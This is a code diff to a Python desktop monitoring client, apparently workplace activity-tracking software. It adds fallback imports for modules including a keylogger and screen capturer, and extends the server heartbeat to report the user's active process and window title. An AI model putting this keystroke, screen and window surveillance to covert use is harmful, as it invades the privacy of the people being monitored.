@@ -6,25 +6,46 @@ import uuid
 from datetime import datetime
 from zoneinfo import ZoneInfo
 
-from client.buffer import LocalBuffer
-from client.capturer import capture_all_screens, compute_screen_hash
-from client.config import (
-    DATA_DIR,
-    get_local_ip,
-    is_registered,
-    load_config,
-    save_config,
-)
-from client.connection import ConnectionMonitor
-from client.identity import (
-    fetch_server_settings,
-    register_with_server,
-    update_display_name,
-)
-from client.keylogger import KeyLogger
-from client.process_monitor import ProcessMonitor
-from client.tray import TrayIcon
-from client.uploader import Uploader
+try:
+    from client.buffer import LocalBuffer
+    from client.capturer import capture_all_screens, compute_screen_hash
+    from client.config import (
+        DATA_DIR,
+        get_local_ip,
+        is_registered,
+        load_config,
+        save_config,
+    )
+    from client.connection import ConnectionMonitor
+    from client.identity import (
+        fetch_server_settings,
+        register_with_server,
+        update_display_name,
+    )
+    from client.keylogger import KeyLogger
+    from client.process_monitor import ProcessMonitor
+    from client.tray import TrayIcon
+    from client.uploader import Uploader
+except ImportError:
+    from buffer import LocalBuffer
+    from capturer import capture_all_screens, compute_screen_hash
+    from config import (
+        DATA_DIR,
+        get_local_ip,
+        is_registered,
+        load_config,
+        save_config,
+    )
+    from connection import ConnectionMonitor
+    from identity import (
+        fetch_server_settings,
+        register_with_server,
+        update_display_name,
+    )
+    from keylogger import KeyLogger
+    from process_monitor import ProcessMonitor
+    from tray import TrayIcon
+    from uploader import Uploader
 
 logging.basicConfig(
     level=logging.INFO,
@@ -214,14 +235,15 @@ class TAMClient:
             if self._shutdown.is_set():
                 break
             try:
-                event = {
-                    "id": uuid.uuid4().hex,
-                    "user_id": self._config["user_id"],
-                    "event_type": "HEARTBEAT",
-                    "timestamp": self._now(),
-                    "details": f"ip={get_local_ip()}",
-                }
-                self._uploader.upload_event(event)
+                local_ip = get_local_ip()
+                window_info = self._process_monitor.get_active_window_info() if self._process_monitor else {}
+                self._uploader.send_heartbeat(
+                    user_id=self._config["user_id"],
+                    local_ip=local_ip,
+                    status="ONLINE",
+                    active_process=window_info.get("process_name", ""),
+                    active_window=window_info.get("window_title", ""),
+                )
             except Exception as exc:
                 logger.error("Heartbeat error: %s", exc)
 
